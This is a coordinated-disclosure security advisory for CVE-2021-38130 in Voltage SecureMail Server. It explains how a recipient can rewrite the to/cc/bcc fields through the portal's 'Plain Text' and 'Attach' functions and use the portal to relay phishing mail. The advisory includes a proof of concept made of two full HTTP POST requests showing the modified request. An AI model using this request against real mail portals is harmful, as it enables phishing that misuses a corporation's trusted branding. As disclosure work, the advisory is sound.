@@ -1,0 +1,291 @@
+id: 37314
+date: 02/05/2022
+title: Voltage SecureMail Server Business Logic Bypass Vulnerability
+author: TING Meng Yean
+cves: CVE-2021-38130
+
+=======================================================================
+              title: Business Logic Bypass - Mail Relay
+                     (Post-authenticated)
+            product: Voltage SecureMail Server
+ vulnerable version: Voltage SecureMail Server <v7.3.0.1
+      fixed version: Voltage SecureMail Server v7.3.0.1
+         CVE number: CVE-2021-38130
+             impact: Medium
+           homepage: https://www.microfocus.com/en-us/cyberres/data-privacy-protection/secure-mail
+              found: 2021-06-25
+                 by: TING Meng Yean (GIS Red Team)
+                     United Overseas Bank Limited (UOB)
+
+=======================================================================
+
+Vendor description:
+-------------------
+Voltage SecureMail simplifies compliance to privacy regulations,
+including MA, PCI, HITECH, UK FSA, and EU Data privacy directives,
+and mitigates the risk of email security breaches. Voltage SecureMail
+provides end-to-end security for email and attachments, inside the
+enterprise to the desktop, at the enterprise gateway, and across
+leading mobile smartphones and tablets. The solution provides the
+confidence and peace of mind that sensitive data is protected in
+transit and in storage, wherever it is in an email system to any
+inbox (e.g., Outlook, Lotus Notes, Gmail, and Yahoo!), without
+disrupting existing email services or business processes.
+
+Source: http://www.securemailworks.com/SecureMail.asp
+
+
+Business recommendation:
+------------------------
+The vendor provides a patch and users of this product are urged to
+upgrade to the latest version available.
+
+Reference: https://portal.microfocus.com/s/article/KM000003667
+
+An in-depth security analysis performed by security professionals is
+highly advised, as the software may be affected from further security
+issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+Business Logic Bypass - Mail Relay (Post-authenticated)
+- CVE CVE-2021-38130
+- CWE-284: Improper Access Control
+- CVSSv3: 5.4 (Medium)
+https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N
+
+
+Voltage SecureMail is an email protection service that provides email
+encryption. With each secure email, there is an HTML attachment named
+"message_zdm.html" that furnishes access to the Zero Download Messenger
+(ZDM), which can be a web portal or mobile app. The encrypted body of
+the original message as well as any attachments to the original email
+is contained within this attachment.
+
+The email recipient needs to install Voltage SecureMail app (for mobile) or
+browse to the Voltage SecureMail Server portal (desktop) to authenticate and
+view any secure email and attachments sent via ZDM.
+
+When the recipient opens the "message_zdm.html" file for the first time
+on a desktop, the browser is brought to the corporation's SecureMail
+portal where the user has to create a password in order to continue.
+
+An email verification email is sent to the recipient with a One Time Link,
+and the recipient can read the email on the SecureMail portal after clicking
+on the link.
+
+If the recipient opens the "message_zdm.html" file again in the future,
+the recipient has to input the previously created password.
+
+When viewing the email on the SecureMail portal, the recipient can
+choose to reply to the email by clicking "Reply" or "Reply to All".
+The SecureMail portal only allows the recipient to reply to the
+original email sender and to the email addresses in the Cc/Bcc list.
+However, it is possible to modify the original email addresses in the
+"to", "cc" or "bcc" fields, or to add arbitrary email addresses, by
+sending a special POST request.
+
+As the SecureMail portal displays the logo and valid SSL certificate of
+the corporation in use, an attacker who have received a SecureMail encrypted
+email previously can make use of the SecureMail portal to send phishing
+emails to third parties. Note that the attacker is unable to spoof
+the "from" address, so the emails to third parties will be from the
+attacker's email address.
+
+
+Proof of concept:
+-----------------
+When the recipient replies to the email by clicking "Reply" or "Reply to All", the
+recipient is brought to the "Compose New Message" page. To send the email reply,
+the recipient then clicks on the "Send Secure" button.
+
+The SecureMail portal does not allow the modification of the "to", "cc" or
+"bcc" field if the user attempts to intercept the POST request after
+clicking on the "Send Secure" button.
+
+However, if the user attempts to intercept the POST request after
+clicking on the "Plain Text" button, the modification of the "to", "cc" or
+"bcc" field is successful.
+
+The modified email is then successfully sent out after the user
+click on the "Send Secure" button.
+
+It is noted that there is one difference in the POST request parameters
+between a "Send Secure" and "Plain Text" that allows the "to", "cc" and
+"bcc" fields to be modified, and the difference is the "send" versus "x"
+parameters. The rest pf the contents of the "Send Secure" and "Plain Text"
+POST requests are almost identical.
+
+
+
+Original "Send Secure" Request
+########################################################################
+POST /writer/br/<...snipped...>?messageId=8243308068279188139899373802011392625 HTTP/1.1
+Host: <...snipped...>
+Cookie: JSESSIONID=<...snipped...>; zdmSessionId=<...snipped...>; zdmIdentity=<...snipped...>; CSRFToken=<...snipped...>
+Content-Type: multipart/form-data; boundary=---------------------------289584800395870328816642372
+Te: trailers
+
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="CSRFToken"
+
+<...snipped...>
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="c"
+
+c3
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="h"
+
+h924481124
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="send"
+
+send
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="senderKeyEnc"
+
+<...snipped...>
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="to"
+
+original.sender@corp.com
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="showCcEnabled"
+
+on
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="cc"
+
+
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="bcc"
+
+
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="subject"
+
+RE: <...snipped...>
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="attachment"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="editModeToggle"
+
+0
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="body"
+
+<...snipped...>
+-----------------------------289584800395870328816642372
+########################################################################
+
+
+
+
+Modified "Plain Text" request
+########################################################################
+POST /writer/br/<...snipped...>?messageId=8243308068279188139899373802011392625 HTTP/1.1
+Host: <...snipped...>
+Cookie: JSESSIONID=<...snipped...>; zdmSessionId=<...snipped...>; zdmIdentity=<...snipped...>; CSRFToken=<...snipped...>
+Content-Type: multipart/form-data; boundary=---------------------------289584800395870328816642372
+Te: trailers
+
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="CSRFToken"
+
+<...snipped...>
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="c"
+
+c3
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="h"
+
+h924481124
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="x"
+
+x
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="senderKeyEnc"
+
+<...snipped...>
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="to"
+
+victim1@external.com
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="showCcEnabled"
+
+on
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="cc"
+
+victim2@external.com
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="bcc"
+
+victim3@external.com
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="subject"
+
+RE: <...snipped...>
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="attachment"; filename=""
+Content-Type: application/octet-stream
+
+
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="editModeToggle"
+
+1
+-----------------------------289584800395870328816642372
+Content-Disposition: form-data; name="body"
+
+<...snipped...>
+-----------------------------289584800395870328816642372--
+########################################################################
+
+
+As of the patched Voltage SecureMail Server version 7.3.0-259490, the
+vulnerability for the "Plain Text" was no longer replicable. However, the same
+vulnerability can be replicated using the "Attach" function.
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested and found to be vulnerable:
+* 7.3
+* 7.3.0-259490
+
+
+Vendor contact timeline (GMT+8):
+--------------------------------
+2021-06-25: Contacting vendor through their SecureMail product support team.
+2021-06-28: Contacting Micro Focus Product Security Response Team (PSRT)
+            security@microfocus.com to request for CVE number.
+2021-06-29: Micro Focus PSRT opened PSRT case 80358.
+2021-07-02: SecureMail product support team confirmed the vulnerability and
+            working on patch.
+2021-07-31: SecureMail product support team released test patch v7.3.0-259490.
+2021-08-04: Confirmed vulnerability "Plain Text" function was no longer
+            replicable, but the same vulnerability can be replicated using the
+            "Attach" function. Notified the SecureMail product support team.
+2021-11-11: SecureMail product support team released patch v7.3.0.1.
+2022-01-21: Requested Micro Focus PSRT for updates.
+2022-01-24: Micro Focus PSRT responded with assigned CVE number.
+2022-01-29: Micro Focus PSRT published security bulletin.
+2022-02-03: Coordinated release of security advisory.
+
+
+Solution:
+---------
+According to the vendor, Voltage SecureMail resolved this vulnerability
+in the version 7.3.0.1 patch release and customers should contact their support
+representative for information about downloading and applying the patch.
+
+#  0day.today [2023-03-23]  #
